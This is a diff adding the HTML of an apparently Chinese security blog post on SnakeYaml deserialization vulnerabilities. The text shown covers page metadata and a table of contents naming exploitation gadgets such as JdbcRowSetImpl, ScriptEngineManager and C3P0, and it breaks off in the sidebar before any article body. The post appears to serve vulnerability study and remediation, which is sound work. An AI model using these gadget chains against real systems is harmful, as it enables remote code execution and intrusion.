@@ -1,0 +1,984 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.26.8" theme-name="Stellar" theme-version="1.26.8">
+  
+  <meta name="generator" content="Hexo 7.1.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel="preconnect" href="https://gcore.jsdelivr.net" crossorigin><link rel="preconnect" href="https://unpkg.com" crossorigin><link rel="preconnect" href="https://cdn.bootcdn.net" crossorigin>
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  
+  <title>漏洞篇 - SnakeYaml 反序列化 - 妙尽璇机</title>
+
+  
+    <meta name="description" content="SnakeYaml 反序列化又来炒冷饭了伙计们。 一、SnakeYaml 简介SnakeYaml 是 Java 中解析 yaml 的库，而 yaml 是一种人类可读的数据序列化语言，通常用于编写配置文件等。 YAML 的语法和其他高级语言类似，并且可以简单表达清单、散列表，标量等数据形态。它使用空白符号缩进和大量依赖外观的特色，特别适合用来表达或编辑数据结构、各种配置文件、倾印调试内容、文件大纲（">
+<meta property="og:type" content="article">
+<meta property="og:title" content="漏洞篇 - SnakeYaml 反序列化">
+<meta property="og:url" content="https://changeyourway.github.io/2025/05/17/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-SnakeYaml%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="妙尽璇机">
+<meta property="og:description" content="SnakeYaml 反序列化又来炒冷饭了伙计们。 一、SnakeYaml 简介SnakeYaml 是 Java 中解析 yaml 的库，而 yaml 是一种人类可读的数据序列化语言，通常用于编写配置文件等。 YAML 的语法和其他高级语言类似，并且可以简单表达清单、散列表，标量等数据形态。它使用空白符号缩进和大量依赖外观的特色，特别适合用来表达或编辑数据结构、各种配置文件、倾印调试内容、文件大纲（">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250422225618-o5mnsu3.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250424160304-qprjtu9.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250424160949-baouee6.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250424161427-1srh3y1.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250424161821-4ha3jog.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250424162335-j8e3ibj.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250424162551-frlmau3.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250424162708-tmx1ws0.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250424162853-9afu12g.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250424163609-tv4j5j4.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250424170706-aluk348.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250424170843-ldpq9sg.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250424171407-7legtwr.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250424171536-hfmmwwp.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250424172114-k8xgf3t.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250424172445-pop7j3k.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250502142918-9h8s8pj.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250502143006-zoz5ro7.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250504134119-j0au1ie.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250504134149-mg7piss.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250502143600-crbibr2.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250425111706-liqa3ol.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250425111752-n616wvd.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250425122541-x1ei678.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250502144356-eyux82j.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250502144757-4eb35lx.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250502145459-0bsxp7l.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250504132907-0gac1c0.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250504135259-aktkyxg.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250504140534-9ejiepz.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250503165647-nytn8jg.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250503171351-45brz61.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250503171718-hl34xyn.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250503184301-g4ouxxx.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250504144829-yohcil0.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250503203119-3y2gr9d.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250503212612-a7sgnl1.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250503212512-1fbsm0r.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250419202147-a2edofn.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250419202236-ash0975.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250419202519-i4xws4r.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250419203035-j0wjaek.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250419203254-4dxnopx.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250419203658-5xe7wc1.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250419203943-cv23ee1.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250419204159-ut2xpyf.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250419205818-e1buhws.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250419210421-metwhbh.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250504171527-b64lc85.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250504171738-1jxeap3.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250504171840-sn7k4pm.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250504172150-rd4vywo.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250504172610-0ooq51r.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250504173241-bmy0b1b.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250504174103-whlk7th.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250504174245-hbqsvcm.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250504174439-0mwiqld.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250504174552-1wwl1d6.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250419211943-8jyj3lh.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250419212454-v23ebd3.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250419212604-pocgg49.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250419213357-u6uqsxh.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250419214818-5gfje1c.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250419220332-zz12lr6.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250420141744-swssji2.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250420143151-p9hrlv5.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250420144737-lm30pvw.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250420144847-vms5fv8.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250420145845-ei2je9j.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250420170204-1ahgl98.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250420173444-svoekjs.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250420173759-2jqm3er.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250420174240-916rvf4.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250420191618-fuz3fs9.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250420191714-jh4mhag.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250420192340-n5f5l95.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250505103004-zrbasc3.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250422234843-skf6aoh.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250422232413-36r7xp7.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250506000727-me5vd0g.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250505232624-hgbi6yy.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250505232631-ja63k89.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250515100928-ujwd03o.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250514174435-8vlt6vm.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250515101009-02478xz.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250515100347-qgpwp04.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250515101059-y4qj11a.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250515101114-fx19u3o.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250515225137-3pujps8.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250515224929-9dgbc37.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250516103810-7xsjkuc.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250516110646-oonvonf.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250517205301-4hblmq3.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250517211813-1ymjj00.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250517212133-rpau4fo.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250517212412-59r5ckv.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250517213053-9akl6d7.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250517213133-xszqhx0.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250517214107-0hn2h2u.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250517215109-7lm90l4.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250517215155-0nw51fm.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250517215213-fq99ecu.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250517215409-k4s5m3r.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250517215532-mh96emp.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250517231034-e2u52vi.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250517231202-v81f470.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250517231105-566myxz.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250517231403-mm095x0.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250517232006-kh6vctr.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250517232037-xuroidy.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20250517233136-0fecfe2.png">
+<meta property="article:published_time" content="2025-05-17T15:57:00.988Z">
+<meta property="article:modified_time" content="2025-05-17T15:59:41.701Z">
+<meta property="article:author" content="妙尽璇机">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://changeyourway.github.io/images/image-20250422225618-o5mnsu3.png">
+  
+  
+  
+  
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="妙尽璇机" type="application/atom+xml">
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.26.8">
+
+  
+    <link rel="shortcut icon" href="/assets/favicon/favicon.ico">
+  
+
+  
+
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/assets/xaoxuu/favicon/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/xaoxuu/favicon/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/xaoxuu/favicon/favicon-16x16.png"><link rel="manifest" href="/assets/xaoxuu/favicon/site.webmanifest"><link rel="shortcut icon" href="/assets/xaoxuu/favicon/favicon.ico"><meta name="theme-color" content="#f8f8f8"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/lxgw-wenkai-screen-webfont/1.7.0/style.min.css" media="all" />
+</head>
+<body>
+
+<div class="l_body content tech" id="start" layout="post" ><aside class="l_left"><div class="sidebar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://avatars.githubusercontent.com/u/167730365?s=96&v=4" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">妙尽璇机</div><div class="sub cap">命途为茧，此身为烛</div></a></div></header>
+
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="专栏" href="/topic/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="探索" href="/explore/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="社交" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
+</div>
+<div class="widgets">
+
+<widget class="widget-wrapper toc single" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SnakeYaml-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">SnakeYaml 反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81SnakeYaml-%E7%AE%80%E4%BB%8B"><span class="toc-text">一、SnakeYaml 简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x1%EF%BC%9Ayaml-%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="toc-text">0x1：yaml 基本语法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81yaml-%E5%AF%B9%E8%B1%A1"><span class="toc-text">1、yaml 对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81yaml-%E6%95%B0%E7%BB%84"><span class="toc-text">2、yaml 数组</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E5%A4%8D%E5%90%88%E7%BB%93%E6%9E%84"><span class="toc-text">3、复合结构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81%E7%BA%AF%E9%87%8F"><span class="toc-text">4、纯量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5%E3%80%81%E5%BC%95%E7%94%A8"><span class="toc-text">5、引用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x2-%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%87%BD%E6%95%B0"><span class="toc-text">0x2 序列化和反序列化函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81SnakeYaml-%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8"><span class="toc-text">二、SnakeYaml 快速入门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-text">三、原理分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x1-%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90"><span class="toc-text">0x1 序列化分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE%E6%80%BB%E7%BB%93"><span class="toc-text">调用链总结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x2-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90"><span class="toc-text">0x2 反序列化分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE%E6%80%BB%E7%BB%93-1"><span class="toc-text">调用链总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90"><span class="toc-text">四、漏洞利用与分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x1%EF%BC%9AJdbcRowSetImpl"><span class="toc-text">0x1：JdbcRowSetImpl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x2%EF%BC%9AScriptEngineManager"><span class="toc-text">0x2：ScriptEngineManager</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81SnakeYaml-%E8%B0%83%E7%94%A8%E6%9C%89%E5%8F%82%E6%9E%84%E9%80%A0"><span class="toc-text">1、SnakeYaml 调用有参构造</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AF-SPI-%E6%9C%BA%E5%88%B6"><span class="toc-text">2、什么是 SPI 机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">3、漏洞复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-text">4、原理分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x3%EF%BC%9ASpring-PropertyPathFactoryBean"><span class="toc-text">0x3：Spring PropertyPathFactoryBean</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x4%EF%BC%9AC3P0-WrapperConnectionPoolDataSource"><span class="toc-text">0x4：C3P0 WrapperConnectionPoolDataSource</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x5%EF%BC%9AC3P0-JndiRefForwardingDataSource"><span class="toc-text">0x5：C3P0 JndiRefForwardingDataSource</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x6%EF%BC%9AApache-XBean"><span class="toc-text">0x6：Apache XBean</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x7%EF%BC%9AApache-Commons-Configuration"><span class="toc-text">0x7：Apache Commons Configuration</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">1、漏洞复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">2、漏洞原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81SnakeYaml-%E8%B0%83%E7%94%A8-hashCode"><span class="toc-text">3、SnakeYaml 调用 hashCode()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x8%EF%BC%9AJetty-Resource"><span class="toc-text">0x8：Jetty Resource</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-text">五、漏洞修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E7%BB%93%E8%AF%AD"><span class="toc-text">六、结语</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">七、参考文章</span></a></li></ol></div></div></widget>
+
+
+
+
+
+
+
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span><a class="cap-action" id="rss" title="Subscribe" href="/atom.xml"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M5 21q-.825 0-1.412-.587T3 19q0-.825.588-1.412T5 17q.825 0 1.413.588T7 19q0 .825-.587 1.413T5 21m13.5 0q-.65 0-1.088-.475T16.9 19.4q-.275-2.425-1.312-4.537T12.9 11.1q-1.65-1.65-3.762-2.687T4.6 7.1q-.65-.075-1.125-.512T3 5.5q0-.65.45-1.062t1.075-.363q3.075.275 5.763 1.563t4.737 3.337q2.05 2.05 3.338 4.738t1.562 5.762q.05.625-.363 1.075T18.5 21m-6 0q-.625 0-1.075-.437T10.85 19.5q-.225-1.225-.787-2.262T8.65 15.35q-.85-.85-1.888-1.412T4.5 13.15q-.625-.125-1.062-.575T3 11.5q0-.65.45-1.075t1.075-.325q1.825.25 3.413 1.063t2.837 2.062q1.25 1.25 2.063 2.838t1.062 3.412q.1.625-.325 1.075T12.5 21"/></svg></a></div><div class="widget-body fs14"><a class="item title" href="/2025/02/20/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="title">漏洞篇 - Hessian 反序列化详解</span></a><a class="item title active" href="/2025/05/17/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-SnakeYaml%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="title">漏洞篇 - SnakeYaml 反序列化</span><svg class="active-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M21 11.098v4.993c0 3.096 0 4.645-.734 5.321c-.35.323-.792.526-1.263.58c-.987.113-2.14-.907-4.445-2.946c-1.02-.901-1.529-1.352-2.118-1.47a2.225 2.225 0 0 0-.88 0c-.59.118-1.099.569-2.118 1.47c-2.305 2.039-3.458 3.059-4.445 2.945a2.238 